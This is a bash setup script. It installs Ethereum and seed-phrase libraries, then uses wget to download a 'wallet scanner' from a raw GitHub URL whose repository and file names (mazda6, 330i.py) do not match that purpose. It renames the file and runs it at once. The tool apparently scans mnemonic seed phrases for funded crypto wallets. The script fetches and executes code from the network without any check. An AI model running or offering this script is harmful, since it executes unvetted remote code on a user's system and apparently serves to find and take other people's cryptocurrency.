#!/bin/bash

# Update system packages
echo "[INFO] Updating system packages..."
sudo apt update && sudo apt upgrade -y

# Install Python3 and pip if not already installed
echo "[INFO] Installing Python3 and pip..."
sudo apt install -y python3 python3-pip

# Install required Python libraries
echo "[INFO] Installing required Python libraries..."
pip3 install mnemonic eth_account web3 psutil requests

# Download the wallet scanner script
echo "[INFO] Downloading wallet scanner script..."
wget -O wallet_scanner.py https://raw.githubusercontent.com/ngocsuo/mazda6/refs/heads/master/330i.py

# Ensure the script has execution permissions
echo "[INFO] Setting execution permissions for the script..."
chmod +x wallet_scanner.py

# Run the wallet scanner script
echo "[INFO] Running the wallet scanner script..."
python3 wallet_scanner.py
